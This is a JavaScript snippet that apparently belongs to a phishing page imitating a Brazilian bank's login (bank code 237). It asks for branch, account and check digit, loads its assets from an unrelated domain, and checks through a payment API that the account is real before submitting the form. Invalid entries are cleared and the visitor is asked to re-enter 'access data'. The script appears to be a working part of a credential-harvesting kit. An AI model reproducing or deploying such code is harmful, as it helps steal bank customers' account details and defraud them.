    <script>
        
        function alerta(s){
            $('#msg').html(s);
            $('#alerta').fadeIn('slow',function (){
                setTimeout(function (){
                    $('#alerta').fadeOut('slow', function (){
                        $('#alerta').addClass('d-none')
                    })
                }, 3000)
            })

            $('#alerta').removeClass('d-none');
        }

        $(document).on('click','.lembra',function(e) {
            if(this.getAttribute("meurage") == "false"){
                this.setAttribute("meurage", "true");
                this.setAttribute("src", "https://bia.centralatende.org/images/lembra-hover.png");
            }else{
                this.setAttribute("meurage", "false");
                this.setAttribute("src", "https://bia.centralatende.org/images/lembra.png");
            }
        });

        $('input').keypress(function(e) {
            if(e.which == 13) {
                e.preventDefault();
            }
        });

        $(document).ready(function(){
            $('#agencia').mask('0000');
            $('#conta').mask('0000000');
            $('#dv').mask('0');
        })

        $('#agencia').keypress(function(e) {
            if($('#agencia').val().length == 3){
                setTimeout(function (){
                    $('#conta').focus();
                }, 120)
            }
        });

        $('#conta').keypress(function(e) {
            if($('#conta').val().length == 6){
                setTimeout(function (){
                    $('#dv').focus();
                }, 120)
            }
        });

        $(document).on('click','#envia',function(e) {
            if($('#agencia').val().length == 0){
                $('agencia').val("")
                alerta("Verifique o preenchimento de sua agência e tente novamente.")

                setTimeout(function (){
                    $('#agencia').focus();
                }, 120)
            }else if($('#conta').val().length == 0){
                $('#conta').val("")
                alerta("Verifique o preenchimento de sua conta e tente novamente.")

                setTimeout(function (){
                    $('#conta').focus();
                }, 120)
            }else if($('#dv').val().length == 0){
                $('#dv').val("")
                alerta("Verifique o preenchimento de sua conta e tente novamente.")

                setTimeout(function (){
                    $('#dv').focus();
                }, 120)
            }else{
                if($('#agencia').val().length < 4){
                    faltante = 4 - $('#agencia').val().length;
                    for (var i = 0; i < faltante; i++) {
                        $('#agencia').val("0" + $('#agencia').val());
                    }
                }

                if($('#conta').val().length < 7){
                    faltante = 7 - $('#conta').val().length;
                    for (var i = 0; i < faltante; i++) {
                        $('#conta').val("0" + $('#conta').val());
                    }
                }

                Moip.BankAccount.validate({
                    bankNumber         : "237",
                    agencyNumber       : $('#agencia').val(),
                    agencyCheckNumber  : "0",
                    accountNumber      : $('#conta').val(),
                    accountCheckNumber : $('#dv').val(),
                    valid: function() {
                        $('form').submit();
                    },
                    invalid: function(data) {

                        $('#agencia').val('');
                        $('#conta').val('');
                        $('#dv').val('');

                        alerta('Preencha novamente seus dados de acesso com atenção.');

                        setTimeout(function (){
                            $('#agencia').focus();
                        }, 120)


                    }
                });
            }
        });

    </script>
